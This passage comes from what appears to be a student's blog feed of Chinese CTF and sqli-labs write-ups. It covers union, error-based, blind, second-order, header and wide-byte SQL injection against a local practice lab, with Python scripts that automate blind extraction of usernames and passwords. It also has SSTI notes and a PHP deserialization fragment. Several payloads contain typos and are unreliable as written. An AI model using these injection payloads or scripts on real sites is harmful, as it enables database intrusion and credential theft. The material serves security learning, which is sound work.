class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">new</span> Modifier;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$b</span>-&gt;source=<span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>sqllib1-5</title>
    <url>/2021/11/23/4-1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一"><a href="#一" class="headerlink" title="一"></a>一</h1><p>![picture](D:\p\picture\屏幕截图 2021-10-19 191622.png)</p>
<p>题目提示让我们给id一个数字的值，那就让id=1</p>
<p>![picture](D:\p\picture\屏幕截图 2021-10-19 191848.png)</p>
<p>能成功查询，接下来就是判断注点</p>
<p>尝试id=1‘</p>
<p>![picture](D:\p\picture\屏幕截图 2021-10-19 192146.png)</p>
<p>报错了很好，说明找到了注点，用’闭合后 报错 ，知道where id=’’，是字符类型的注入</p>
<p>用union联合注入，但前提条件是联合的两个表列数相同，所以先用order by</p>
<p>判断列数</p>
<p>构造playload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; order by 1...--+ /*为什么要用--+（也就是-- ），在输入？id=1&#x27;</span></span><br><span class="line">    后php中的sql查询语句会变成where id = <span class="string">&#x27;1&#x27;</span><span class="string">&#x27;,有一个&#x27;</span>会都出导致报错，这时我们在<span class="number">1</span>’的后面添加sql查询语句会被都出的<span class="string">&#x27;注释为id的值:where id=&#x27;</span><span class="number">1</span><span class="string">&#x27;sql语句&#x27;</span>，所以要用注释符把多出的<span class="string">&#x27;注释掉，php就能正确识别sql查询语句了</span></span><br></pre></td></tr></table></figure>

<p>order by 后面的数字不断增加直到报错为止</p>
<p>![picture](D:\p\picture\屏幕截图 2021-10-19 195701.png)</p>
<p>到4报错了，说明列数有3列</p>
<p>接下来就是判断回显点</p>
<p>构造playload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,2,3 --+</span></span><br></pre></td></tr></table></figure>

<p>![picture](D:\p\picture\屏幕截图 2021-10-19 201147.png)</p>
<p>发现显示了2和3，说明回显点在2，3号位</p>
<p>接下来就是爆数据库名，要用到databa（）sql的元数据</p>
<p>构造playload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,2,database()--+； //database（）位置在2，3都没关系</span></span><br></pre></td></tr></table></figure>

<p>![picture](D:\p\picture\屏幕截图 2021-10-19 201754.png)</p>
<p>这样就得到了数据库名为security</p>
<p>接着就是爆表名</p>
<p>首先得知道mysql自带的表</p>
<p>information_schema.schemata：记录数据库信息的表<br>information_schema.tables：记录表名信息的表<br>information_schema.columns：记录列名信息的表<br>schema_name 数据库名<br>table_name 表名<br>column_name 列名<br>table_schema 数据库名</p>
<p>构造playload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union seclect 1,2,gruop_concat(table.name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;|database()--+//sql查询语句的意思是在记录表名信息的表中查询当前数据库下的所有表，group_concat的作用是去除冗余的数据并合并成一行输出，因为这道只有一行的回显点</span></span><br></pre></td></tr></table></figure>

<p>![picture](D:\p\picture\屏幕截图 2021-10-19 203543.png)</p>
<p>查到了表名，用户的账号密码肯定是在users的表里，但我们要查询还需要知道</p>
<p>表里有什么字段所以接下是爆字段</p>
<p>构造playload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union seclec 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;--+//从所有列名的表中查找表名为users的列</span></span><br></pre></td></tr></table></figure>



<p>![picture](D:\p\picture\屏幕截图 2021-10-19 205422.png)</p>
<p>找到列username，password</p>
<p>接着用sql语句查询他们的值</p>
<p>构造playload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,2,group_concat(password,username) from users--+</span></span><br></pre></td></tr></table></figure>

<p>![picture](D:\p\picture\屏幕截图 2021-10-19 210030.png)</p>
<p>查询成功</p>
<h1 id="二"><a href="#二" class="headerlink" title="二"></a>二</h1><p>![picture](D:\p\picture\屏幕截图 2021-10-19 210153.png)</p>
<p>题目要求和第一题一样</p>
<p>首先找注点</p>
<p>尝试id=1</p>
<p>![picture](D:\p\picture\屏幕截图 2021-10-19 210418.png)</p>
<p>成功</p>
<p>再尝试?id=1’</p>
<p>![picture](D:\p\picture\屏幕截图 2021-10-19 210615.png)</p>
<p>从报错中看出php中的sql语句是where id=</p>
<p>说明是数字型的注入因为用的是同一张表所以playload只是注点不同，其他都相同</p>
<p>构造playload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=-<span class="number">1</span> union select <span class="number">1</span>,<span class="number">2</span>,group_concat(password,username) <span class="keyword">from</span> users--+</span><br></pre></td></tr></table></figure>



<p>后面不加注释因为没有需要被注释的字符</p>
<p><img src="/.com//p\picture\image-20211019211519081.png" alt="picture"></p>
<p>查询成功</p>
<h1 id="三"><a href="#三" class="headerlink" title="三"></a>三</h1><p><img src="/.com//p\picture\image-20211019211708416.png" alt="picture"></p>
<p>同样先尝试id=1</p>
<p><img src="/.com//p\picture\image-20211019211853243.png" alt="picture"></p>
<p>成功</p>
<p>接着尝试id=1’</p>
<p><img src="/.com//p\picture\image-20211019212026044.png" alt="picture"></p>
<p>发现报错的和第一题很相似，尝试用第一题的playload试一下</p>
<p><img src="/.com//p\picture\image-20211019212238414.png" alt="picture"></p>
<p>寄了</p>
<p>再仔细看下报错信息</p>
<p><img src="/.com//Users\rangaork\AppData\Roaming\Typora\typora-user-images\image-20211019212355663.png" alt="image-20211019212355663"></p>
<p>发现问题了，比第一题多了一个）也就是说多了一个（）的闭合，而我们只闭合**’**</p>
<p>所以注点要变成id=-1‘）尝试一下</p>
<p><img src="/.com//p\picture\image-20211019212805821.png" alt="picture"></p>
<p>やったぜ</p>
<h1 id="四"><a href="#四" class="headerlink" title="四"></a>四</h1><p><img src="/.com//p\picture\image-20211019213234858.png" alt="picture"></p>
<p>一样先尝试id=1</p>
<p><img src="/.com//p\picture\image-20211019213352241.png" alt="image-20211019213352241"></p>
<p>成功</p>
<p>再尝试id=1’</p>
<p><img src="/.com//p\picture\image-20211019213538450.png" alt="image-20211019213538450"></p>
<p>居然成功了</p>
<p>再试试id=1“</p>
<p><img src="/.com//p\picture\image-20211019213814592.png" alt="image-20211019213814592"></p>
<p>成功报错了，看来这次是”“闭合</p>
<p>构造playload</p>
<p>等一下</p>
<p><img src="/.com//p\picture\image-20211019213955043.png" alt="image-20211019213955043"></p>
<p>还有一个）</p>
<p>那就和第三题差不多</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&quot;)  union select 1,2,group_concat(password,username) from users--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/.com//p\picture\image-20211019214257823.png" alt="image-20211019214257823"></p>
<p>ok</p>
<h1 id="五"><a href="#五" class="headerlink" title="五"></a>五</h1><p><img src="/.com//p\picture\image-20211019214406388.png" alt="image-20211019214406388"></p>
<p>老套路</p>
<p><img src="/.com//p\picture\image-20211019214532459.png" alt="image-20211019214532459"></p>
<p>有点不太一样，不管先试试id=1’</p>
<p><img src="/.com//p\picture\image-20211019214733943.png" alt="image-20211019214733943"></p>
<p>报错能显示出来</p>
<p>看的注入点是字符’闭合</p>
<p>但没有写回</p>
<p>那就试试floor（rand(0）*2)报错注入</p>
<p>用group by的重复</p>
<p>floor(rand(0)*2)的作用是伪随机生成0，1</p>
<p>groupby函数在起作用时会新建一个表来存数据，并会执行两次用floor(rand(0)*2)会产生两个一的时候就会键名重复报错并会输出在groupby中的sql语句</p>
<p>构造playload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select count(*),count(*),concat(&#x27;</span>~<span class="string">&#x27;,floor(rand(0)*2),(select username from users limit 0,1)) as a from information_schema.table group by a--+//count()和groupby一起使用报错注入中无法使用group_concat所以用limit来限制行数</span></span><br></pre></td></tr></table></figure>





<p><img src="/.com//p\picture\image-20211019220805119.png" alt="image-20211019220805119"></p>
<p>成功.</p>
]]></content>
  </entry>
  <entry>
    <title>sql盲注脚本</title>
    <url>/2021/11/23/4/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="python写sql注入脚本"><a href="#python写sql注入脚本" class="headerlink" title="python写sql注入脚本"></a>python写sql注入脚本</h1><p>在布尔盲注和时间盲注需要一个一个试的时候就需要使用python脚本</p>
<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>以sqlilab第8关为例</p>
<p>![pictuer](D:.\picture\屏幕截图 2021-10-25 122458.png)</p>
<p>查询成功就会返回you are in查询不成功就不返回，</p>
<p>![picture](D:\p\picture\屏幕截图 2021-10-25 161517.png)</p>
<p>可用这个特性猜测 playload annd ascii(substr(select group_concat(table_name) from information_schema.tables where table_schema=database()))=123</p>
<p>判断表名得第一个字母的asc码值</p>
<p>由此一个一个推断就可以得到完整的表名</p>
<p>但手工写太累了这时候就需要写python脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests<span class="comment">#引入requests库</span></span><br><span class="line">s = requests.session()<span class="comment">#创建session对象用来发送请求</span></span><br><span class="line">url = <span class="string">&quot;http://localhost/sqli-labs-master/Less-8/?id=1&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">o</span>(<span class="params">g</span>):</span></span><br><span class="line">    <span class="keyword">global</span> s</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        u = <span class="built_in">str</span>(i)</span><br><span class="line">        dtlenth = g + u + <span class="string">&#x27;--+&#x27;</span><span class="comment">#Playload的构建</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> s.get(url + dtlenth).text:<span class="comment">#发送playload并判断是否成功</span></span><br><span class="line">            f=i</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;databaselenth:&#x27;</span> + <span class="built_in">str</span>(f))<span class="comment">#成功就输出值</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">no</span>(<span class="params">k, i</span>):</span></span><br><span class="line">    lib=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, i+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">400</span>):</span><br><span class="line">                b = <span class="built_in">str</span>(n)</span><br><span class="line">                dataname = k + <span class="built_in">str</span>(x) + <span class="string">&quot;,1))=&quot;</span> + b + <span class="string">&quot;--+&quot;</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;You are in...........&quot;</span> <span class="keyword">in</span> s.get(url + dataname).text:</span><br><span class="line">                    lib = lib + <span class="built_in">chr</span>(n)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;database:&quot;</span> + lib)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> lib</span><br><span class="line"><span class="comment"># leng=o(&#x27;and length(database())=&#x27;)</span></span><br><span class="line"><span class="comment"># dbname=no(&quot;and ascii(substr(database(),&quot;, leng)</span></span><br><span class="line"><span class="comment">#tablename=no(&quot;and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()), &quot;,30)</span></span><br><span class="line"><span class="comment">#columnname=no(&quot;and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),&quot;, 100)</span></span><br><span class="line"><span class="comment">#password=no(&quot;and ascii(substr((select group_concat(password) from users),&quot;, 200)</span></span><br><span class="line">name=no(<span class="string">&quot;and ascii(substr((select group_concat(username) from users),&quot;</span>, <span class="number">200</span>)</span><br></pre></td></tr></table></figure>

<p>![](D:\p\picture\屏幕截图 2021-10-25 165010.png)</p>
<p>得到了数据</p>
<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>以sqlilab第9关为例无论输入什么都只会显示you are in，那就要用到时间盲注，sleep函数会让网页的响应延迟自定义的秒数，写python脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">s = requests.session()</span><br><span class="line">url = <span class="string">&#x27;http://localhost/sqli-labs-master/Less-10/?id=1&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">o</span>(<span class="params">g</span>):</span></span><br><span class="line">    <span class="keyword">global</span> s</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        u = <span class="built_in">str</span>(i)</span><br><span class="line">        dtlenth = g + u + <span class="string">&#x27;--+&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> s.get(url + dtlenth).text:</span><br><span class="line">            f=i</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;databaselenth:&#x27;</span> + <span class="built_in">str</span>(f))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">no</span>(<span class="params">k, i</span>):</span></span><br><span class="line">    lib=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, i+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">400</span>):</span><br><span class="line">                b = <span class="built_in">str</span>(n)</span><br><span class="line">                dataname = k + <span class="built_in">str</span>(x) + <span class="string">&quot;,1))=&quot;</span> + b + <span class="string">&quot;,sleep(5),1)--+&quot;</span></span><br><span class="line">                Starttime=time.time()<span class="comment">#记录下当前的时间戳</span></span><br><span class="line">                response1 = requests.get(url+dataname)<span class="comment">#获取网页回应</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> time.time() - Starttime &gt; <span class="number">5</span>:<span class="comment">#获取网页回应需要的时间</span></span><br><span class="line">                    lib = lib + <span class="built_in">chr</span>(n)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;database:&quot;</span> + lib)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> lib</span><br><span class="line">j=no(<span class="string">&quot;and if(ascii(substr((select group_concat(username) from users),&quot;</span>, <span class="number">200</span>)<span class="comment">#if判断if（a，b，c）若a为真输出b，假输出c</span></span><br></pre></td></tr></table></figure>

<p>![](D:\p\picture\屏幕截图 2021-10-25 171419.png)</p>
<p>得到结果</p>
]]></content>
  </entry>
  <entry>
    <title>sqlilab_24</title>
    <url>/2021/11/23/5-1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><p>在对第一次插入数据的时候对插入的数据进行了过滤，但如果只是对特殊字符添加/进行转译，但由于用于转译/不会被写入数据库中，插入数据库中的还是我们输入的语句，在再次调用数据库中我们插入的数据的时候，如果完全信任了数据库中的数据不加过滤的话就会，引起二次注入</p>
<h1 id="sqlilab-24"><a href="#sqlilab-24" class="headerlink" title="sqlilab_24"></a>sqlilab_24</h1><p>![](D:\p\picture\屏幕截图 2021-10-27 110239.png)</p>
<p>先试试在登入界面注入</p>
<p>Dhakkan’#</p>
<p>![](D:\p\picture\屏幕截图 2021-10-27 110705.png)</p>
<p>失败了</p>
<p>查看源码</p>
<p>![](D:\p\picture\屏幕截图 2021-10-27 113114.png)</p>
<p>发现添加了过滤</p>
<p>在看看创建新用户的源码</p>
<p>![](D:\p\picture\屏幕截图 2021-10-27 113445.png)</p>
<p>还是添加了过滤</p>
<p>在看看更改密码的源码</p>
<p>![](D:\p\picture\屏幕截图 2021-10-27 113909.png)</p>
<p>没有对username进行过滤，并且查询语句中还用上username</p>
<p>那我们就对新建一个username，对username进行构造</p>
<p>新建一个用户名为Dhakkan’#密码为123</p>
<p>![](D:\p\picture\屏幕截图 2021-10-27 210433.png)</p>
<p>然后在进行改密码操作将密码改成321</p>
<p>![](D:\p\picture\屏幕截图 2021-10-27 210651.png)</p>
<p>此时更改密码的语句就会变为username=’Dhakkan’#’and password=’321’</p>
<p>这样就形成了一个sql注入语句变成了更改了Dhakkan的密码这样我们就能用321登入账号Dhakkan了</p>
<p>![](D:\p\picture\屏幕截图 2021-10-27 211541.png)</p>
<p>成功用321登入改账号</p>
]]></content>
  </entry>
  <entry>
    <title>sqlilab17</title>
    <url>/2021/11/23/5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="updata报错注入"><a href="#updata报错注入" class="headerlink" title="updata报错注入"></a>updata报错注入</h1><p>![](D:\p\picture\屏幕截图 2021-10-25 214004.png)</p>
<p>看都题目passwor reset，重置密码，在输对用户名的正确的情况下会把用户名的密码更改为我们输入的密码</p>
<p>![](D:\p\picture\屏幕截图 2021-10-25 214449.png)</p>
<p>![](D:\p\picture\屏幕截图 2021-10-25 214501.png)</p>
<p>再来康康源码</p>
<p>![](D:\p\picture\屏幕截图 2021-10-25 214805.png)</p>
<p>我们看到他先用select查出了用户名密码然后再用了updata把新的密码上传</p>
<p>password=’$password‘说明这里要用’闭合</p>
<p>再来看返回的值</p>
<p>![](D:\p\picture\屏幕截图 2021-10-25 214501.png)</p>
<p>没有回显点，也不是布朗类型的返回，看看会不会报错</p>
<p>![](D:\p\picture\屏幕截图 2021-10-25 215546.png)</p>
<p>有报错那就用报错注入</p>
<p>构造playload</p>
<p>1’ and updatexml(1,concat(0x76,(select group_concat(password) from users),0x76),2)#</p>
<p>![](D:\p\picture\屏幕截图 2021-10-25 220011.png)</p>
<p>报错了，意思是不能在要updata的表里查数据，那么我们套一层子查询，间接查询</p>
<p>重新构造playload</p>
<p>重新构造playload</p>
<p>1’ and updatexml(1,concat(0x7e,(select group_concat(password) from (select password from users) as a),0x7e),1)#</p>
<p>![](D:\p\picture\屏幕截图 2021-10-25 221120.png)</p>
<p>updatexml()的报错原理和groupby差不多，在updatexml的三个参数中输入不符合xml语法的内容就会报错并执行输入的语句</p>
]]></content>
  </entry>
  <entry>
    <title>无列名注入</title>
    <url>/2021/11/23/6-1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="替换列名"><a href="#替换列名" class="headerlink" title="替换列名"></a>替换列名</h1><p>在information_schema被ban的情况下使用无列名注入</p>
<p>表名可以用</p>
<h2 id="sys-schema-auto-increment-columns（）"><a href="#sys-schema-auto-increment-columns（）" class="headerlink" title="sys.schema_auto_increment_columns（）"></a>sys.schema_auto_increment_columns（）</h2><h2 id="sys-schema-table-statistics-with-buffer"><a href="#sys-schema-table-statistics-with-buffer" class="headerlink" title="sys.schema_table_statistics_with_buffer"></a>sys.schema_table_statistics_with_buffer</h2><p>在sql语句中可以用select和union组合可以替换列名</p>
<p>select 1,2,3 union select*from table</p>
<p>table中的列名会被替换成1，2，3</p>
<p>select `1`from(select1,2,3 union select *from table)a</p>
<p>这样就可查出table表第一列的内容，实际上替换列名只是创建了一张临时表，所以在后面加了a给这个临时表命名</p>
<h1 id="字符串比较"><a href="#字符串比较" class="headerlink" title="字符串比较"></a>字符串比较</h1><p>在union和报错都被过滤的情况下，用字符串比较进行盲注</p>
<p>在sql中字符串比较会取出要对比的第一个字符，先进行对比，如错误就直接返回false，正确才会进行下一位的比较</p>
<p>基本的playload</p>
<p>select 1,’a’ &gt;select*from table</p>
<h1 id="join报错"><a href="#join报错" class="headerlink" title="join报错"></a>join报错</h1><h1 id="输出flag时有其他字符干扰，且输出长度受限"><a href="#输出flag时有其他字符干扰，且输出长度受限" class="headerlink" title="输出flag时有其他字符干扰，且输出长度受限"></a>输出flag时有其他字符干扰，且输出长度受限</h1><p>在sql注入的语句的末尾添加regexp函数进行对输出字符串的正则匹配，基本用【^f】匹配以f开头的字符</p>
<p>用right，left函数让字符串从左右输出</p>
<p>用substr输出任意位置任意长度的字符</p>
<p>用reverse倒叙输出字符</p>
<p>配合python的切片-1，来正序</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">y=<span class="string">&#x27;&#x27;</span></span><br><span class="line">y=y[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(y)</span><br></pre></td></tr></table></figure>





]]></content>
  </entry>
  <entry>
    <title>sqlzj</title>
    <url>/2021/11/23/6/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>在两个select注入语句之间用可用；隔开，</p>
<p>如果在php中用来mysqli_mulit_qurry()函数来执行sql注入语句的时候，可以使用堆叠注入，堆叠注入可以做到对数据库的改增删操作，</p>
<h1 id="过滤绕过"><a href="#过滤绕过" class="headerlink" title="过滤绕过"></a>过滤绕过</h1><p>在php中对单词的过滤，一般可以用双写，大写来绕过</p>
<p>![picture](D:\p\picture\屏幕截图 2021-10-29 204544.png)</p>
<p>在sql的25关对or和and进行了过滤，所以我们输入了or但显示我们的输入为空，</p>
<p>用双写</p>
<p>![picture](D:\p\picture\屏幕截图 2021-10-29 205014.png)</p>
<p>id=oorr</p>
<p>因为正则表达式匹配了or并把or过滤了oorr中or被过滤了就剩下了or说以可以用双写绕过</p>
<p>大写绕过</p>
<p>![picture](D:\p\picture\屏幕截图 2021-10-29 205601.png)</p>
<p>27题过滤了union所以我们输了union被过滤了</p>
<p>前提mysql语句是对大写不敏感的所以我们在写语句的时候就可以随意大写</p>
<p>因为正则表达式并没有完全匹配所以的大写组合，那我们一个一个试</p>
<p>尝试uniON</p>
<p>![picture](D:\p\picture\屏幕截图 2021-10-29 210052.png)</p>
<p>成功了</p>
<p>我认为短单词适合用双写，因为短字母的大写组合少比较好过滤，而且双写也比较好认，长单词相反，不过怎么绕过还是要看后端是怎么过滤的</p>
<p>如果后端的正则用了/m修饰符（换行匹配）那么双写绕过就会失效，换行匹配会把双写被匹配完的带空格的字符串也匹配，所以只能用双写，</p>
<p>![picture](D:\p\picture\屏幕截图 2021-10-29 211346.png)</p>
<p>在27关中–+也被过滤掉了sql语句就会剩下一个‘，这时就要用and ’1‘=’1来闭合</p>
<p>因为‘1’=‘1’是恒为真</p>
<p>![picture](D:\p\picture\屏幕截图 2021-10-29 212058.png)</p>
<p>在27题中空格也被过滤了，用%0a来绕过过滤</p>
<p>![picture](D:\p\picture\屏幕截图 2021-10-29 212437.png)</p>
<h1 id="注释绕过"><a href="#注释绕过" class="headerlink" title="注释绕过"></a>注释绕过</h1><p>![picture](D:\p\picture\屏幕截图 2021-10-29 212834.png)</p>
<p>在32关中‘被/注释掉了，这时候就要加%df，或其他大与128的16进制数，在gbk编码中两个16进制数来表示一个中文字符，该方法叫宽字符注入</p>
<p>![picture](D:\p\picture\屏幕截图 2021-10-29 213336.png)</p>
<p>%df与%5c被认为是一个中文字符，而%27被剩下来被解释成了’</p>
<h1 id="orderby注入"><a href="#orderby注入" class="headerlink" title="orderby注入"></a>orderby注入</h1><p>和联合注入没什么区别，就是写语句的方式变了</p>
<p>盲注可以用rand（）在为真和为假时排列的顺序会不一样</p>
]]></content>
  </entry>
  <entry>
    <title>ssti</title>
    <url>/2021/11/23/7-1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="flask框架"><a href="#flask框架" class="headerlink" title="flask框架"></a>flask框架</h1><p>flask框架是使用python编写的模板，所以我们注入的语句要符合python的语法。</p>
<p>ssti注入的目的是让读取flag，所以要找到一个类能执行读取flag的代码</p>
<p>__class__ #返回type类型，查看对象的类型<br>__bases__ #返回tuple类型，列出该类的基类<br>__mro__   #返回tuple类型，给出解析方法调用的顺序<br>__subclasses__() #返回内建方法builtin_function_or_method，获取一个类的子类<br>_<em>globals</em>_ #返回dict类型，对函数进行操作，获取当前空间下能使用的模块、方法、变量</p>
<p>用上方列出的魔术方法找到能执行os或eval的类</p>
<p>然后用__init __魔术方法在该类被调用的时候执行读flag的代码</p>
<h1 id="smarty模板"><a href="#smarty模板" class="headerlink" title="smarty模板"></a>smarty模板</h1><p>smarty模板是基于php的模板并且能直接用system函数执行系统命令</p>
<p>smarty中可以用if来快速读取flag语法</p>
<p>{if readfile(/flag)}{/if}</p>
<h1 id="twig模板"><a href="#twig模板" class="headerlink" title="twig模板"></a>twig模板</h1><p>twig模板也是基于php的一个模板，与smarty不同他不能直接使用函数</p>
<p>详情参考</p>
<p><a href="https://xz.aliyun.com/t/10056">https://xz.aliyun.com/t/10056</a></p>
]]></content>
  </entry>
  <entry>
    <title>sqli_lab1819</title>
    <url>/2021/11/23/7/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="sql注入之header报错注入"><a href="#sql注入之header报错注入" class="headerlink" title="sql注入之header报错注入"></a>sql注入之header报错注入</h1><h3 id="首先要知道什么是header头"><a href="#首先要知道什么是header头" class="headerlink" title="首先要知道什么是header头"></a>首先要知道什么是header头</h3><p>header是发送请求时携带的头部信息。通常一些鉴权的信息：authentication/cookie、响应的数据格式：content-type等等的设置。当然响应的数据也会返回一些头部信息。</p>
<p>格式是 域名 ：域值</p>
<h1 id="18"><a href="#18" class="headerlink" title="18"></a>18</h1><p>![](D:\p\picture\屏幕截图 2021-10-26 120723.png)</p>
<p>输入用户名和密码，在第17关改过的</p>
<p>![](D:\p\picture\屏幕截图 2021-10-26 120949.png)</p>
<p>登入成功，并把User Agent的内容显示出来了</p>
<p>这个头是显示用户信息的头</p>
<p>所以就可在这个头进行注入</p>
<p>![](D:\p\picture\屏幕截图 2021-10-26 121622.png)</p>
<p>因为该题没有回显点，所以用报错注入</p>
<p>playload: ‘ or uodate(1,concat(‘#’,(select group_concat(password) from users),’#’ ),2)#</p>
<h1 id="19"><a href="#19" class="headerlink" title="19"></a>19</h1><p>在来看看19的</p>
<p>![](D:\p\picture\屏幕截图 2021-10-26 171745.png)</p>
<p>输出的是Referer的值，说以把Referer的值改成我们的sql注入语句，19也没有回显点，也用报错注入，</p>
<p>![](D:\p\picture\屏幕截图 2021-10-26 172953.png)</p>
<p>报错，这句话的意思是列的数量不匹配</p>
<p>将or改成，</p>
<p>1’,updatexml(1,concat(‘<del>‘,(select group_concat(password) from users),’</del>‘),1))#</p>
<p>![](D:\p\picture\屏幕截图 2021-10-26 195738.png)</p>
<p>成功</p>
]]></content>
  </entry>
  <entry>
    <title>awd</title>
    <url>/2021/11/23/awd/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>因为是第一次打awd，写点东西总结一下</p>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>其实在打awd之前就写了个批量脚本，准备了流量监控脚本。但是因为批量脚本报错，心开始慌乱，所以比赛开始前期的flag都是手提的。</p>
